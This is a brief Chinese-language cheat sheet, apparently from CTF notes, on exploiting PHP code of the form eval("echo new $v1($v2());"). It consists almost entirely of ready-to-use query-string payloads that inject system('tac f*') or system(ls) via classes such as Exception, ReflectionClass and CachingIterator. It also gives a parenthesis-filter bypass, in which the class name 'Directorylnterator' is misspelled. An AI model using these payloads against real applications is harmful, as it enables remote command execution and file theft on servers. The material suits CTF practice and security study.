
## **eval和new**
```
eval("echo new $v1($v2());");

让new后面有个正常的类不报错，后拼接操作。payload:
v1=Exception();system('tac f*');//&v2=a

或使用echo是的$v1触发__toString()，此时传递的$v2参数会被输出。
再对v2后面的括号进行解释，如v2=system(ls)，$v2()会把 $v2 返回的值会作为函数Q名去调用，但是调用失败了。
v1=ReflectionClass&v2=phpinfo
v1=ReflectionClass&v2=system('tac f*')
v1=CachingIterator&v2=system(ls)
v1=Exception&v2=system(ls)
```
如果有过滤不能使用()
```
v1=Directorylnterator&v2=phpinfo
```